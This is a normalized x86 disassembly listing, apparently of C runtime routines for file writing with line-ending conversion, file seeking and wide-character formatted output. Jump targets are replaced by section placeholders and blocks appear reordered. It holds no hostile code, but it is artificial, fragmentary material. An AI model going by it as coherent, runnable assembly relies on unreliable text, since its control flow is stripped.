mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40a09d
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_40b6e3
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_40a33b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_40a33b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_40b6e3
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_409185
push 0x18
push r--data
call sub_405550
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
jmp r-xdata
call sub_40587b
and [ eax ] 0x0
call sub_4058af
mov [ eax ] 0x9
call sub_405a91
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_40b544
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_4058af
mov [ eax ] 0x9
call sub_40587b
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_409281
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_405595
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409257
mov edx ebx
jmp r-xdata
sub_409281
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40b656
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_4058af
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_40588e
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_4092f2
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_40716c
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_409338
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
call sub_405d89
call sub_4058af
mov [ ebp - 0x45c ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
cmp [ ebp - 0x440 ] bl
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404072
leave
retn
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x434 ]
test ecx ecx
je r-xdata
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
cmp [ ebp - 0x440 ] 0x0
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x434 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
shr eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x8
je r-xdata
je r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_409f6c ]
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_409f8c
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_404081
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_409fee
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_409fc2
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_40a0ae
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x464 ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_40a067
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_40a248
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_409fee
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_409fc2
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_40716c
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_408120
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_409fc2
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x464 ]
call sub_409f8c
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_406440
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x464 ]
push ecx
push eax
call sub_40a248
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_409f8c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_40a0c3
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
sub_409fc2
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_409f8c
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_409fee
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_409f8c
mov eax [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x2
add esp 0xc
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_409f8c
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_40a067
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_405d89
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40a0c3
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0xc ] 0x40
jne r-xdata
add [ edi + 0x4 ] 0xfffffffe
js r-xdata
push edi
call sub_408801
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push edi
push eax
call sub_40b898
pop ecx
pop ecx
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edi ] 0x2
jmp r-xdata
mov eax ebx
push edi
call sub_408801
pop ecx
cmp eax 0xfffffffe
je r-xdata
